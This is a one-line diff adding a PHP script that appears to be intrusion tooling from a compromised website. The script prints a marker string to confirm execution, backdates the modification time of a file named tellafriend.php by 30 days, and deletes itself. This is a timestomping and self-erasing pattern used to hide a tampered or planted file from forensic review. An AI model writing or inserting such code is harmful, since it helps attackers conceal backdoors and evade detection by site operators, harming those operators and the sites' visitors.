@@ -1,0 +1,1 @@
+<?php echo "fdXtaBdKBD"; if (file_exists("./tellafriend.php")){ touch("./tellafriend.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*fct2ArXmcKZPseMqGyuh*/ ?>
